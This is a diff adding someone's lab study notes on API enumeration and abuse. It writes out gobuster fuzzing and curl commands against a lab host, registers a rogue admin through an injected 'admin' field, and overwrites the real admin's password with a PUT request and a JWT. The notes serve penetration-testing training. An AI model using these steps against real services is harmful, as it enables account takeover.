@@ -38,12 +38,90 @@ Http headers that start with X- generally mean non standard. X- headers are depr
 
 ### 8.3.3. Enumerating and Abusing APIs
 
+api paths are often followed by versions e.g /api_name/v1
+
+API busting using both a wordlist and pattern combined
+
+step1) create a list called pattern
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+
+step2 gobuster
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+
+Website.com/ui -> The /ui path has documentation on all apis... usually only available with whitebox testing
+
+curl -i http://192.168.50.16:5002/users/v1
+:-i show headers
+
+target admin user for api
+gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+
+attempt to curl password from users api
+curl -i http://192.168.50.16:5002/users/v1/admin/password
+
+erro 405 = url is present but we need to use another type of http request
+
+Attempt to convert get request into post request
+curl request with parameters wrapped in json (pretty easy {"fieldname":"value","fieldname2":"value2"}
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+-d: Send data in a post request
+-H: add header to request
+
+failed Attempt to use register api via curl
+curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
+
+fixed attempt to register now with email as a parameter added. they also guessed that there is an admin parameter that accepts True or False
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+
+log in using curl to our created admin account. The response may have a token we can use for further attacks 
+curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+Failed attempt Using that token returned to change the admin's account password (failed because the method wasn't allowed)
+NOTE: Realize that this exploit is happening within HTTP Headers!
+curl  \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+  -d '{"password": "pwned"}'
+
+Fixed attempt using Put method to replace the value instead of creating one
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+
+final login to verify exploit
+curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+Summary of what they did...
+They found APIS by using a fuzzer (enumeration)
+
+They tried using the api with various parameters to further dig into it.
+e.g. gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt to target the admin user.
+This shows that http://192.168.50.16:5002/users/v1/admin/email and http://192.168.50.16:5002/users/v1/admin/password apis exist.
+They noticed that the api responds in JSON so sent all further requests using JSON
+
+They guessed that a login api probably exists (operating under unknowns)
+curl -i http://192.168.50.16:5002/users/v1/login
+
+they converted get request to post request
+
+Then they created an admin account to change the actual admin's password
+
+
+
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
+8.3.3 Enumerating and Abusing APIs
+ https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/JSON
+ https://en.wikipedia.org/wiki/JSON_Web_Token 
+
 
 8.3.2. Inspecting HTTP Response Headers and Sitemaps
 https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
